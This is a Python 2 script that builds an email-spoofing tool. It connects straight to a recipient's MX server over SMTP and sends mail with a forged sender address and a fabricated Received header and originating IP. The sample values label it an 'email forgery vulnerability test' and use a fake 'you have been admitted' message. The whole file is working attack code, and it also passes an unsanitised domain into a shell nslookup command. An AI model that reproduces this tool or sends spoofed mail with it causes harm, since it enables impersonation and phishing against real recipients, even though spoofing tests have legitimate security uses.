# -*- coding: utf-8 -*-
import socket,select,base64,os,re,time,datetime
class mail:
    def __init__(self):
        self.errmsg = ''
    def send(self, buf):
        try:
            byteswritten = 0
            while byteswritten < len(buf):
                byteswritten += self.__sockfd.send(buf[byteswritten:])
        except:
            pass

    def recvline(self, strline):
        detect_fds = [self.__sockfd,]
        rrdy, wrdy, erdy = select.select(detect_fds, [], [], 20)
        if len(rrdy) == 0:
            return False
        else:
            while True:
                try:
                    strtmp = self.__sockfd.recv(1)
                    strline[0] += strtmp[0]
                    if(strtmp[0] == '\n'):
                        print 'server : '+strline[0]
                        break
                except:
                    return False
            return True

    def getresp(self, resp_str):
        while True:
            if(self.recvline(resp_str) == False):
                return False
            else:
                if resp_str[0][3] != '-':
                    break;
        return True

    def mailhelo(self, hostname):
        self.send('helo %s\r\n'%hostname)
        print 'host say: helo %s'%hostname
        resp_str = ['',]
        if(self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def mailfrom(self, fromstr):
        self.send('mail from: <%s>\r\n'%fromstr)
        print 'host say: mail from: <%s>'%fromstr
        resp_str = ['',]
        if(self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def mailto(self, tostr):
        self.send('rcpt to: <%s>\r\n'%tostr)
        print 'host say: rcpt to: <%s>'%tostr
        resp_str = ['',]
        if(self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def maildata(self):
        self.send('data\r\n')
        print 'host say: data'
        resp_str = ['',]
        if(self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '354':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def mailbody(self, bodystr):
        print 'host say: '+'.for <'+self.To+'>; '+time.strftime("%a, %d %b %Y %H:%M:%S +0800 (CST)",time.localtime())+'\r\n'
        print 'host say: '+'From: "=?GB2312?B?zfU=?=" <'+self.From+'>\r\n'
        print 'host say: '+'Subject:'+self.Subject+'?=\r\n'
        print 'host say: '+'To: <'+self.To+'>\r\n'
        print 'host say: '+bodystr

        self.send('Received: from ICE (unknown [8.8.8.8])\r\n')
        self.send('.by 8.8.8.8 (Coremail) with SMTP id _bJCALesoEAeAFMU.1\r\n')
        self.send('.for <'+self.To+'>; '+time.strftime("%a, %d %b %Y %H:%M:%S +0800 (CST)",time.localtime())+'\r\n')
        self.send('X-Originating-IP: [8.8.8.8]\r\n')
        self.send('Date: '+time.strftime("%a, %d %b %Y %H:%M:%S +0800",time.localtime())+'\r\n')
        self.send('From: '+self.FromName+ '<'+self.From+'>\r\n')
        self.send('Subject: '+self.Subject+'\r\n')
        self.send('To: <'+self.To+'>\r\n')
        self.send('X-Priority: 1\r\n')
        self.send('X-mailer: iceMail 1.0 [cn]\r\n')
        self.send('Mime-Version: 1.0\r\n')
        self.send('Content-Type: text/plain;\r\n')
        self.send('.charset="GB2312"\r\n')
        self.send('Content-Transfer-Encoding: quoted-printable\r\n\r\n')
        self.send(bodystr)
        self.send('\r\n.\r\n')
        resp_str = ['',]
        if(self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def mailquit(self):
        self.send('quit\r\n')
        print 'host say: quit'
        resp_str = ['',]
        if(self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '221':
            print 'server : Bye'
            print 'mail send ok'
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def txmail(self, hostname, mailfrom, rcptto, bodystr):
        mx_server_list = []
        mail_postfix = re.split('@',rcptto)
        #print mail_postfix
        try:
            outstr = os.popen('nslookup -type=mx -timeout=10 %s'%mail_postfix[1], 'r').read()
        except Exception, e:
            print 'DEBUG: Execute nslookup:',e
            return False

        linestr = re.split('\n', outstr)
        for s in linestr:
            if re.match('.+[ |\t]mail exchanger[ |\t].+', s) != None:
                c = re.split(' |\t', s)
                mx_server_list.append(c[len(c) - 1])

        if len(mx_server_list) == 0:
            self.errmsg = 'Can not find MX server'
            return False

        for mx_element in mx_server_list:
            return_val = True
            mx_server_ip = socket.gethostbyname(mx_element)
            tx_sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
            try:
                tx_sockfd.connect((mx_server_ip, 25))
                self.__sockfd = tx_sockfd
                resp_str = ['',]
                self.getresp(resp_str)
                if self.mailhelo(hostname) and self.mailfrom(mailfrom) \
                     and self.mailto(rcptto) and self.maildata() and self.mailbody(bodystr) and self.mailquit():
                    pass
                else:
                    return_val = False
            except Exception, e:
                return_val = False
            try:
                tx_sockfd.close()
            except:
                pass

            if return_val == True:
                break

        return return_val
    def sendMail(self):
        self.StmpHost=self.From.split("@")[1]
        self.txmail(self.StmpHost, self.From, self.To, self.Data)

if __name__ == '__main__':
    icemail=mail()
    icemail.Port=25
    icemail.To='接收邮箱'
    icemail.From='伪造的邮箱'
    icemail.FromName='test'
    icemail.Subject='邮件伪造漏洞测试'
    icemail.Data='你被录取了'
    icemail.sendMail()
